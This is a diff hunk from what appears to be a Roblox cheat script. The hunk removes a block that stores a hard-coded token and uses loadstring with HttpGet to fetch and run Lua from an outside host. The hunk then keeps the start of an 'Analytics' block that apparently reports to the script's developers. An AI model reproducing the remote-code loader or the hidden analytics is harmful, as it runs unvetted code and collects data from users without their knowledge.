@@ -3793,18 +3793,8 @@ if game.PlaceId == 3541987450 or game.PlaceId == 5208655184 or game.PlaceId == 1
                 end
             end)
         end
-
-        do -- Logging
-            do -- Stella
-                getgenv().stella_token = "2cbc19e1a7366f0a71b65856257ae123e1ab81c05126c53d61ca529af319c65c"
-                getgenv().stella_debug = false
-
-                pcall(function()
-                    loadstring(game:HttpGet("https://stella.heroinhound.cc/stella.lua",true))() -- or u can use https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPOSITORY/refs/heads/main/hello_stella.lua but stella.heroinhound.cc/stella.lua will hold the most updates although i rarely update stella payload but U NEVER KNOW. just check back.
-                end)
-            end
-
-            do -- Analytics (only sent to Hydroxide developers — baba & boss)
+           
+			do -- Analytics (only sent to Hydroxide developers — baba & boss)
                 pcall(function()
                     local function transform(id)
                         local pepper = "HW_"
